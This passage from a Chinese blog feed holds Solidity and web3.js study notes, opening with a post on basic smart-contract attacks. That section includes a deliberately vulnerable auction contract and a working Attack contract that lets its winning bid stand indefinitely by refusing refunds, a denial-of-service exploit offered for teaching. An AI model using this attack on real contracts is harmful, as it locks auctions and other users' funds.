address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4，拒绝服务攻击"><a href="#4，拒绝服务攻击" class="headerlink" title="4，拒绝服务攻击"></a>4，拒绝服务攻击</h3><p><strong>利用合约无法收款的特性来攻击，当合约没用fallback函数与receive函数时合约就无法收到外部转账或者退钱，因此投标函数无法完整的向下执行，不会改变winner的地址，winner会被一直霸占</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract  Auction&#123;</span><br><span class="line">    address public winner;</span><br><span class="line">    uint public amount;</span><br><span class="line">    function bid()external payable&#123;</span><br><span class="line">        require(msg.value&gt;0,&quot;amount is too small&quot;);</span><br><span class="line">        require(msg.value&gt;amount,&quot;amount is too small&quot;);//如不符合要求则进行回退</span><br><span class="line">        payable(winner).transfer(amount);</span><br><span class="line">        winner=msg.sender;</span><br><span class="line">        amount=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()external view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address target,uint amount)external payable&#123;</span><br><span class="line">        Auction(payable (target)).bid&#123;value:amount&#125;();</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="5，访问控制攻击"><a href="#5，访问控制攻击" class="headerlink" title="5，访问控制攻击"></a>5，访问控制攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public – 公共状态变量可以在内部访问，也可以通过消息访问。对于公共状态变量，将生成一个自动getter函数。</span><br><span class="line">internal – 内部状态变量只能从当前合约或其派生合约内访问。</span><br><span class="line">private – 私有状态变量只能从当前合约内部访问，派生合约内不能访问</span><br><span class="line">external — 外部状态变量只能在合约之外调用，不能被合约内的其他函数调用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity基础攻击 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>web3.js学习笔记</title>
      <link href="/2022/10/28/web3.js/web3.js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/28/web3.js/web3.js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="起始公式"><a href="#起始公式" class="headerlink" title="起始公式"></a>起始公式</h1><p>var Web3= require(‘web3’)<br>const rpcURL = “<a href="https://goerli.infura.io/v3/+key">https://goerli.infura.io/v3/+key</a>“<br>const web3 = new Web3(rpcURL)</p><h2 id="消息签名"><a href="#消息签名" class="headerlink" title="消息签名"></a>消息签名</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dataHash = <span class="string">&quot;0x&quot;</span></span><br><span class="line"><span class="keyword">let</span> privateKey = <span class="string">&quot;0x&quot;</span></span><br><span class="line"><span class="keyword">let</span> sign = web3.<span class="property">eth</span>.<span class="property">accounts</span>.<span class="title function_">sign</span>(dataHash, privateKey)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;signature&quot;</span>, sign.<span class="property">signature</span>)    </span><br></pre></td></tr></table></figure><h2 id="区块信息查询"><a href="#区块信息查询" class="headerlink" title="区块信息查询"></a>区块信息查询</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getBlockNumber</span>().<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getBlock</span>();<span class="comment">//&#x27;latest&#x27;,&#x27;earliest&#x27;,&#x27;pending&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.false默认不返回交易详细信息，true返回详细的交易信息 </span></span><br><span class="line"><span class="comment">//2.getBlock中可以通过区块哈希区块高度来查看区块信息</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getBlock</span>(<span class="string">&quot;latest&quot;</span>,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h2 id="账户"><a href="#账户" class="headerlink" title="账户"></a>账户</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查询所有账户地址</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getAccounts</span>().<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建新的账户</span></span><br><span class="line"><span class="comment">//(password,[callback])</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="property">personal</span>.<span class="title function_">newAccount</span>(<span class="string">&#x27;jjk1323423&#x27;</span>).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看挖矿获奖的账户</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getCoinbase</span>().<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">isMining</span>().<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);<span class="comment">//挖矿是否正在进行</span></span><br></pre></td></tr></table></figure><h2 id="查询用户余额及平均gas"><a href="#查询用户余额及平均gas" class="headerlink" title="查询用户余额及平均gas"></a>查询用户余额及平均gas</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查询用户余额</span></span><br><span class="line"><span class="comment">//(address ,[,defaultBlock])</span></span><br><span class="line"><span class="comment">//1.defaultBlock：表示执行到指定区块的余额</span></span><br><span class="line"><span class="comment">//function为回调函数</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getBalance</span>(<span class="string">&#x27;0x8aC8215492Ce132Eb4d1db7EcE3eF0caF670deFf&#x27;</span>,<span class="keyword">function</span>(<span class="params">error,result</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> balance=result.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(web3.<span class="property">utils</span>.<span class="title function_">fromWei</span>(balance,<span class="string">&quot;ether&quot;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//gas价格查询</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getGasPrice</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">result</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wei:&quot;</span>+result)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ether:&quot;</span>+web3.<span class="property">utils</span>.<span class="title function_">fromWei</span>(result,<span class="string">&quot;ether&quot;</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="交易有关内容"><a href="#交易有关内容" class="headerlink" title="交易有关内容"></a>交易有关内容</h2><h3 id="1-发送交易"><a href="#1-发送交易" class="headerlink" title="1. 发送交易"></a>1. 发送交易</h3><p>(transactionObiect,[,callback])<br>transactionObject{<br>    from:<br>    to:<br>    value:<br>    gas:<br>    gasPrice:<br>    data:若发送的为合约，则为合约的ABI文件，否则，则说明信息<br>    noce:这是账号的前一个交易计数，这个值必须为16进制<br>    可以使用Web3.js的web3.utils.toHex()转化</p><p>}<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> transactionObiect=&#123;</span><br><span class="line">    <span class="attr">from</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">to</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">value</span>:web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">    <span class="attr">data</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(transactionObiect).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure></p><h3 id="2-查询交易信息"><a href="#2-查询交易信息" class="headerlink" title="2.查询交易信息"></a>2.查询交易信息</h3><p>getTransactionFromBlock(hashStringOrNumber,indexNumber,[,callback])<br>1.hashStringOrNumber为: 区块号or区块哈希or earliest等<br>2.indexNumber为区块中交易索引，索引从0开始</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getTransactionFromBlock</span>(<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>或者这个也可以<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getTransaction</span>(<span class="string">&#x27;hash&#x27;</span>).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回指定区块发出的交易数量</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getBlockTransactionCount</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询交易收据</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getTransactionReceipt</span>(<span class="string">&quot;hash&quot;</span>).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -web3.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础知识点（一）</title>
      <link href="/2022/10/28/solidity/%EF%BC%88%E4%B8%80%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/10/28/solidity/%EF%BC%88%E4%B8%80%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity-基础知识（一）"><a href="#solidity-基础知识（一）" class="headerlink" title="solidity 基础知识（一）"></a>solidity 基础知识（一）</h1><h2 id="报错控制的相关知识点"><a href="#报错控制的相关知识点" class="headerlink" title="报错控制的相关知识点"></a>报错控制的相关知识点</h2><p>用于检查<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract error&#123;<span class="comment">//报错控制</span></span><br><span class="line">    function <span class="title function_">testrequire</span><span class="params">(uint i)</span>public pure&#123;</span><br><span class="line">        require(i&lt;=<span class="number">10</span>,<span class="string">&quot;i&gt;10&quot;</span>);<span class="comment">//不满足则报错字符串内容</span></span><br><span class="line">    &#125;<span class="comment">//gas费与字符长度有关，报错之后会回滚到报错前的状态</span></span><br><span class="line"></span><br><span class="line">    function <span class="title function_">testrevert</span><span class="params">(uint i)</span>public pure&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">10</span>)&#123;</span><br><span class="line">            revert(<span class="string">&quot;i&gt;10&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        uint public num=<span class="number">123</span>;</span><br><span class="line">        function <span class="title function_">testassert</span><span class="params">()</span>public view&#123;</span><br><span class="line">            assert(num==<span class="number">123</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        function <span class="title function_">foo</span><span class="params">()</span>public&#123;</span><br><span class="line">            num+=<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="comment">//num加1之后就不满足testassert函数，再调用testassert就会报错</span></span><br><span class="line">        error <span class="title function_">Myerror</span><span class="params">(address caller,uint i)</span>;<span class="comment">//自定义错误来节约gas</span></span><br><span class="line">        function <span class="title function_">testcustom</span><span class="params">(uint i)</span>public view&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">10</span>)&#123;</span><br><span class="line">                revert <span class="title function_">Myerror</span><span class="params">(msg.sender,i)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="函数修改器知识"><a href="#函数修改器知识" class="headerlink" title="函数修改器知识"></a>函数修改器知识</h2><p>修饰器（modifier）是 solidity 特有的语法，它就像钢铁侠的智能盔甲，有特定功能，也可以控制访问权限。modifier 的主要使用场景是运行函数前的检查，例如地址，变量，余额等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">contract functionmodifier&#123;<span class="comment">//函数修改器</span></span><br><span class="line">    <span class="type">bool</span> public paused;</span><br><span class="line">    uint public count;</span><br><span class="line">    function <span class="title function_">setPause</span><span class="params">(<span class="type">bool</span> _paused)</span>external&#123;</span><br><span class="line">        paused=_paused;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">whenpaused</span><span class="params">()</span>&#123;</span><br><span class="line">        require(!paused,<span class="string">&quot;paused&quot;</span>);</span><br><span class="line">        _;<span class="comment">//表示函数其他代码在哪里运行,既运行到下划线就会跳入函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">inc</span><span class="params">()</span>external whenpaused&#123;</span><br><span class="line">        <span class="comment">//require(!paused,&quot;paused&quot;);把两个函数相同的require拿出来用函数修改器</span></span><br><span class="line">        count+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     function <span class="title function_">dec</span><span class="params">()</span>external whenpaused&#123;</span><br><span class="line">        <span class="comment">//require(!paused,&quot;paused&quot;);</span></span><br><span class="line">        count-=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">cap</span><span class="params">(uint x)</span>&#123;</span><br><span class="line">        require(x&lt;<span class="number">100</span>,<span class="string">&quot;x&gt;=100&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">incBy</span><span class="params">(uint x)</span>external whenpaused <span class="title function_">cap</span><span class="params">(x)</span>&#123;<span class="comment">//先检查第一个是否满足，然后传入入参数到第二个修改器进行判断</span></span><br><span class="line">        count+=x;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier <span class="title function_">sandwich</span><span class="params">()</span>&#123;<span class="comment">//三明治修改器</span></span><br><span class="line">        count +=<span class="number">10</span>;</span><br><span class="line">        _;</span><br><span class="line">        count *=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>external sandwich&#123;<span class="comment">//先加10，再加1，最后乘2；</span></span><br><span class="line">        count+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>构造函数（constructor）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的 owner 地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract Constructor&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint public x;</span><br><span class="line">    constructor(uint _x)&#123;<span class="comment">//构造函数一般用于初始化变量,部署前传入_x的值</span></span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结1"><a href="#总结1" class="headerlink" title="总结1"></a>总结1</h2><p>前面内容的合成<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: HIT</span></span><br><span class="line">pragma solidity^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract Ownable&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">onlyOwnable</span><span class="params">()</span>&#123;</span><br><span class="line">        require(msg.sender==owner ,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setowner</span><span class="params">(address _newOwner)</span>external onlyOwnable&#123;</span><br><span class="line">        require(_newOwner!=address(<span class="number">0</span>),<span class="string">&quot;invalid address&quot;</span>);</span><br><span class="line">        owner=_newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">onlyOwner</span><span class="params">()</span>external onlyOwnable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">anyone</span><span class="params">()</span>external&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="returns的写法"><a href="#returns的写法" class="headerlink" title="returns的写法"></a>returns的写法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract functionoutput&#123;<span class="comment">//返回写法</span></span><br><span class="line">    function <span class="title function_">returnMany</span><span class="params">()</span>public pure <span class="title function_">returns</span> <span class="params">(uint , <span class="type">bool</span> )</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">named</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(uint x,<span class="type">bool</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">assigned</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(uint x,<span class="type">bool</span> b)</span>&#123;</span><br><span class="line">        x=<span class="number">1</span>;b=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function  <span class="title function_">destructing</span><span class="params">()</span>public pure&#123;<span class="comment">//接收返回值</span></span><br><span class="line">        uint x;<span class="type">bool</span> b;</span><br><span class="line">        ( x , b )=returnMany();</span><br><span class="line">        (, b)=returnMany();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组的知识点"><a href="#数组的知识点" class="headerlink" title="数组的知识点"></a>数组的知识点</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Array&#123;<span class="comment">//数组知识点</span></span><br><span class="line">    uint[]public nums=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];<span class="comment">//动态数组</span></span><br><span class="line">    uint[<span class="number">3</span>]public numsfixed=[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];<span class="comment">//固定数组</span></span><br><span class="line">    uint public x;</span><br><span class="line">    uint public len;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external&#123;</span><br><span class="line">        nums.push(<span class="number">4</span>);   <span class="comment">//[1,2,3,4]</span></span><br><span class="line">         x=nums[<span class="number">1</span>];</span><br><span class="line">        nums[<span class="number">2</span>]=<span class="number">777</span>;   <span class="comment">//[1,2,777,4]</span></span><br><span class="line">        delete nums[<span class="number">1</span>];  <span class="comment">//[1,0,777,4]</span></span><br><span class="line">        nums.pop();  <span class="comment">//[1,0,777]</span></span><br><span class="line">        len=nums.length;  <span class="comment">//数组长度</span></span><br><span class="line">        uint []memory a=new uint[](<span class="number">5</span>);  <span class="comment">//内存中只能固定数组，不能用上面内容</span></span><br><span class="line">        a[<span class="number">1</span>]=<span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">returnarray</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint[] memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> nums; <span class="comment">//返回数组所有的元素</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组的删除函数"><a href="#数组的删除函数" class="headerlink" title="数组的删除函数"></a>数组的删除函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract ArrayShift&#123;</span><br><span class="line">    uint []public arr;</span><br><span class="line">    function <span class="title function_">example</span><span class="params">()</span>public &#123;</span><br><span class="line">        arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">        delete arr[<span class="number">1</span>];<span class="comment">//[1,0,3]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//[1,2,3]--remove(1)--&gt;[1,3,3]--&gt;[1,3]</span></span><br><span class="line">    function <span class="title function_">remove</span><span class="params">(uint _index)</span>public&#123;<span class="comment">//闪出数组中的元素</span></span><br><span class="line">        require(_index&lt;arr.length,<span class="string">&quot;index out of bound&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(uint i=_index;i&lt;arr.length<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            arr[i]=arr[i+<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        arr.pop();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract Mapping&#123;</span><br><span class="line">    uint bal;</span><br><span class="line">    uint bal2;</span><br><span class="line">    mapping(address =&gt;uint)public balances;</span><br><span class="line">    mapping(address=&gt;mapping(address=&gt;<span class="type">bool</span>))public isFriend;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external&#123;</span><br><span class="line">        balances[msg.sender]=<span class="number">123</span>;</span><br><span class="line">        bal =balances[msg.sender];</span><br><span class="line">        bal2=balances[address(<span class="number">1</span>)];<span class="comment">//默认 0</span></span><br><span class="line">        balances[msg.sender]+=<span class="number">456</span>;</span><br><span class="line">        delete balances[msg.sender];<span class="comment">//delete并不是删除，而是回归默认值</span></span><br><span class="line">        isFriend[msg.sender][address(this)]=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="映射与数组的结合，高价值"><a href="#映射与数组的结合，高价值" class="headerlink" title="映射与数组的结合，高价值"></a>映射与数组的结合，高价值</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">contract iterableMapping&#123;<span class="comment">//将数组与映射结合</span></span><br><span class="line">    mapping(address=&gt;uint)public balances;</span><br><span class="line">    mapping(address=&gt;<span class="type">bool</span>)public inserted;</span><br><span class="line">    address[]public keys;</span><br><span class="line">    function <span class="title function_">set</span><span class="params">(address _key,uint _val)</span>external&#123;</span><br><span class="line">        balances[_key]=_val;</span><br><span class="line">        <span class="keyword">if</span>(!inserted[_key])&#123;</span><br><span class="line">            inserted[_key]=<span class="literal">true</span>;</span><br><span class="line">            keys.push(_key);<span 